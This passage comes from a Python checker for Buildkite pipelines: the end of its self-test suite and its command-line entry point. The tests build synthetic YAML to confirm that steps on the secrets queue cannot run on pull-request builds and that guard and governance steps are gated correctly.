                 + "  - wait: ~\n" + gov + evil)
    rows = _evaluate_yaml(leak_pipe, FILES)
    t("gap6 governance leak caught", bool(_failed(rows, "6b")), "")
    t("gap6 leak shape keeps 3b green (isolation)", not _failed(rows, "3b"), "")

    # Check 7: both atoms are required. A non-PR clause alone still matches
    # a branch push and must not select the secrets queue.
    t("predicate rejects pull_request.id == null alone",
      not if_requires_non_pr_and_default_branch(WEAK_IF), "")
    t("predicate rejects default branch alone",
      not if_requires_non_pr_and_default_branch("build.branch == pipeline.default_branch"), "")
    t("predicate rejects a disjunction of the two atoms",
      not if_requires_non_pr_and_default_branch(
          "build.pull_request.id == null || build.branch == pipeline.default_branch"), "")
    t("predicate rejects a missing if",
      not if_requires_non_pr_and_default_branch(None), "")
    t("predicate accepts both atoms",
      if_requires_non_pr_and_default_branch(CLOSED_IF), "")
    t("predicate accepts swapped parenthesized atoms",
      if_requires_non_pr_and_default_branch(
          "(build.branch == pipeline.default_branch) && (build.pull_request.id == null)"), "")
    t("open if is the pull-request or other-branch complement",
      if_is_pull_request_or_other_branch(OPEN_IF), "")
    t("open if rejects pull-request clause alone",
      not if_is_pull_request_or_other_branch("build.pull_request.id != null"), "")

    rows = _evaluate_yaml(VALID.replace(
        f"key: secret-job\n    command: .buildkite/scripts/job.sh\n    if: {CLOSED_IF}\n",
        f"key: secret-job\n    command: .buildkite/scripts/job.sh\n    if: {WEAK_IF}\n",
    ), FILES)
    t("weak if on a secrets step is rejected", bool(_failed(rows, "7 secret-job")),
      f"{_failed(rows, '7 ')}")
    rows = _evaluate_yaml(VALID.replace(
        f"key: guard-content-policy\n    command: .buildkite/scripts/guard-content-policy.sh\n    if: {CLOSED_IF}\n",
        "key: guard-content-policy\n    command: .buildkite/scripts/guard-content-policy.sh\n",
    ), FILES)
    t("secrets guard with no if is rejected", bool(_failed(rows, "7 guard-content-policy")), "")
    rows = _evaluate_yaml(VALID, FILES)
    t("companion if pull-request only passes 2d",
      not _failed(rows, "2d guard-content-policy-pr is the non-secrets step"), "")
    rows = _evaluate_yaml(VALID.replace(
        "key: guard-content-policy-pr\n",
        "key: guard-content-policy-pr\n    soft_fail:\n      - exit_status: 1\n",
    ), FILES)
    t("companion soft_fail rejected",
      bool(_failed(rows, "2d guard-content-policy-pr is the non-secrets step"))
      or bool(_failed(rows, "2s guard-content-policy-pr")), "")
    rows = _evaluate_yaml(VALID.replace("    env: {WAVE_JOB_GUARD_PR: '1'}\n", ""), FILES)
    t("companion must set WAVE_JOB_GUARD_PR",
      bool(_failed(rows, "2d guard-content-policy-pr is the non-secrets step")), "")

    # WAVE-30137: no secrets-queue exemption. The old pull-request-only
    # governance-enforce shape (PR builds on fpc-isolated-secrets) now fails
    # check 7; the main-only shape passes.
    gov_main = ("  - label: gov\n    key: governance-enforce\n"
                "    command: .buildkite/scripts/governance-enforce.sh\n"
                f"    if: {CLOSED_IF}\n"
                "    agents: {queue: fpc-isolated-secrets}\n")  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
    gov_files = FILES + ("governance-enforce.sh",)
    base = "steps:\n" + GUARD_A + "  - wait: ~\n" + GUARD_B_PR + GUARD_B + "  - wait: ~\n"
    rows = _evaluate_yaml(base + gov_main, gov_files)
    t("main-only governance-enforce on secrets queue passes",
      not _failed(rows, "7 governance-enforce"), f"{_failed(rows, '7 ')}")
    for name, cond in (("pull-request-only", "build.pull_request.id != null"),
                       ("non-PR only", WEAK_IF),
                       ("pull request or other branch", OPEN_IF)):
        rows = _evaluate_yaml(base + gov_main.replace(f"if: {CLOSED_IF}", f"if: {cond}"), gov_files)
        t(f"{name} governance-enforce on secrets queue rejected",
          bool(_failed(rows, "7 governance-enforce")), "")
    rows = _evaluate_yaml(base + gov_main.replace(f"    if: {CLOSED_IF}\n", "    branches: main\n"), gov_files)
    t("branches: main without the if on secrets queue rejected",
      bool(_failed(rows, "7 governance-enforce")), "")

    # Any step on the secrets queue: no `if` that a pull-request build can
    # satisfy. Evaluate each secrets step's `if` against a PR build context.
    rows = _evaluate_yaml(base + gov_main.replace(
        "key: governance-enforce\n    command: .buildkite/scripts/governance-enforce.sh\n",
        "key: some-step\n    command: .buildkite/scripts/job.sh\n").replace(
        f"if: {CLOSED_IF}", "if: build.pull_request.id != null"), FILES)
    t("PR-reachable secrets step of any key rejected", bool(_failed(rows, "7 some-step")), "")

    # WAVE-30137 review: the PR-flagged guard twin must be pull-request only.
    # The open `if` also runs it on branch pushes, where the flag exits 2.
    rows = _evaluate_yaml(VALID.replace(f"    if: {PR_IF}\n", f"    if: {OPEN_IF}\n"), FILES)
    t("guard twin with PR-or-other-branch if rejected",
      bool(_failed(rows, "2d guard-content-policy-pr is the non-secrets step")), "")
    rows = _evaluate_yaml(VALID.replace(f"    if: {PR_IF}\n", ""), FILES)
    t("guard twin without if rejected",
      bool(_failed(rows, "2d guard-content-policy-pr is the non-secrets step")), "")

    # Check 7 walks every step type. A plugin-only step, a trigger, a block,
    # a step nested in a group, and a list-form `agents` on the secrets queue
    # with an open `if` all fail; the same shapes with the closed `if` pass.
    sq = "fpc-isolated-secrets"
    shapes = {
        "plugin-only": ("  - label: plug\n    key: plug\n"
                        "    plugins: [{docker#v5.0.0: {image: alpine}}]\n"
                        f"    if: {{IF}}\n    agents: {{queue: {sq}}}\n"),  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
        "group-nested": ("  - group: grp\n    key: grp\n    steps:\n"
                         "      - label: inner\n        key: inner\n"
                         "        command: .buildkite/scripts/job.sh\n"
                         f"        if: {{IF}}\n        agents: {{queue: {sq}}}\n"),  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
        "trigger": (f"  - trigger: other\n    key: trig\n    if: {{IF}}\n"
                    f"    agents: {{queue: {sq}}}\n"),  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
        "block": (f"  - block: hold\n    key: hold\n    if: {{IF}}\n"
                  f"    agents: {{queue: {sq}}}\n"),  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
        "agents-list": ("  - label: lst\n    key: lst\n    command: .buildkite/scripts/job.sh\n"
                        f"    if: {{IF}}\n    agents: [\"queue={sq}\"]\n"),
    }
    for name, tmpl in shapes.items():
        for cond, want_fail in ((OPEN_IF, True), ("build.pull_request.id != null", True),
                                (CLOSED_IF, False)):
            doc = base + tmpl.replace("{IF}", cond)
            rows = _evaluate_yaml(doc, FILES)
            got = bool(_failed(rows, "7 "))
            t(f"check 7 {name} secrets step if={cond!r} {'rejected' if want_fail else 'passes'}",
              got == want_fail, f"{_failed(rows, '7 ')}")
    rows = _evaluate_yaml(base + shapes["plugin-only"].replace("    if: {IF}\n", ""), FILES)
    t("check 7 plugin-only secrets step with no if rejected", bool(_failed(rows, "7 ")), "")

    # WAVE-30138: governance-enforce on fpc-isolated with no env passes
    # check 8; the secrets queue or a step env fails it.
    gov_iso = ("  - label: gov\n    key: governance-enforce\n"
               "    command: .buildkite/scripts/governance-enforce.sh\n"
               "    agents: {queue: fpc-isolated}\n")  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
    rows = _evaluate_yaml(base + gov_iso, gov_files)
    t("governance-enforce on fpc-isolated passes check 8", not _failed(rows, "8 "), f"{_failed(rows, '8 ')}")
    rows = _evaluate_yaml(base + gov_main, gov_files)
    t("governance-enforce on secrets queue fails check 8", bool(_failed(rows, "8 ")), "")
    rows = _evaluate_yaml(base + gov_iso + "    env: {WAVE_JOB_X: '1'}\n", gov_files)
    t("governance-enforce with step env fails check 8", bool(_failed(rows, "8 ")), "")

    print("SELFTEST " + ("ALL PASS" if not fails else f"{len(fails)} FAILURES: {fails}"))
    return 1 if fails else 0


def main(argv):
    if "--selftest" in argv:
        return selftest()
    pipeline = DEFAULT_PIPELINE
    root = None  # default: derived from the pipeline path (its own checkout)
    args = list(argv)
    while args:
        a = args.pop(0)
        if a in ("--pipeline", "--root"):
            if not args:
                print(f"usage: pipeline-gating.py [--pipeline PATH] [--root DIR] [--selftest]; {a} needs a value",
                      file=sys.stderr)
                return 2
            if a == "--pipeline":
                pipeline = Path(args.pop(0))
            else:
                root = Path(args.pop(0))
        elif a.startswith("--"):
            print(f"usage: pipeline-gating.py [--pipeline PATH] [--root DIR] [--selftest]; unknown option {a}",
                  file=sys.stderr)
            return 2
        else:
            print(f"usage: pipeline-gating.py [--pipeline PATH] [--root DIR] [--selftest]; unexpected argument {a}",
                  file=sys.stderr)
            return 2
    if root is None:
        # A pipeline at <root>/.buildkite/pipeline.yml belongs to <root>;
        # existence checks must run against the PIPELINE's checkout, not the
        # checker's (review: a typo'd --pipeline must not silently pass).
        root = pipeline.resolve().parent.parent
    rows = evaluate(str(pipeline), root)
    failures = [n for (n, ok, _d) in rows if not ok and not n.startswith("    simulate")]
    for name, ok, detail in rows:
        if name.startswith("    simulate"):
            print(name)
        else:
            print(("PASS" if ok else "FAIL") + f" {name}" + (f" — {detail}" if detail else ""))
    print("RESULT " + ("ALL PASS" if not failures else f"{len(failures)} FAILURES"))
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
